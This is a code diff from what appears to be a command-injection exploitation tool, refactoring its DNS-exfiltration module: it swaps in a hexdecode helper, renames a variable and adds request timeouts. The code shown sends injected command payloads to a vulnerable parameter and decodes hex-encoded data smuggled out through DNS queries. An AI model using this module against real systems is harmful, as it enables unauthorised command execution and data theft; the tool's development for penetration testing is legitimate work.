@@ -28,6 +28,7 @@ from src.core.requests import tor
 from src.core.requests import proxy
 from src.core.requests import headers
 from src.core.requests import parameters
+from src.core.convert import hexdecode
 from src.core.shells import reverse_tcp
 from src.core.injections.controller import checks
 
@@ -70,7 +71,7 @@ exfiltrate data using a user-defined DNS server [1].
 def querysniff(pkt):
   if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
     if ".xxx" in pkt.getlayer(DNS).qd.qname:
-      print(pkt.getlayer(DNS).qd.qname.split(".xxx")[0].decode("hex"))
+      print(hexdecode(pkt.getlayer(DNS).qd.qname.split(".xxx")[0]))
 
 def signal_handler(signal, frame):
   os._exit(0)
@@ -93,14 +94,14 @@ def cmd_exec(dns_server, http_request_method, cmd, url, vuln_parameter):
   if http_request_method == "GET":
     url = url.replace(settings.INJECT_TAG, "")
     data = payload.replace(" ", "%20")
-    req = url + data
+    request = url + data
   else:
     values =  {vuln_parameter:payload}
     data = _urllib.parse.urlencode(values)
-    req = _urllib.request.Request(url=url, data=data)
+    request = _urllib.request.Request(url=url, data=data)
     
   sys.stdout.write(Fore.GREEN + Style.BRIGHT + "\n")
-  response = _urllib.request.urlopen(req)
+  response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
   time.sleep(2)
   sys.stdout.write("\n" + Style.RESET_ALL)
 
@@ -262,7 +263,7 @@ def dns_exfiltration_handler(url, http_request_method):
 
   else:
     try:
-      response = _urllib.request.urlopen(request)
+      response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
     except _urllib.error.HTTPError as err_msg:
       if str(err_msg.code) == settings.INTERNAL_SERVER_ERROR:
         response = False  
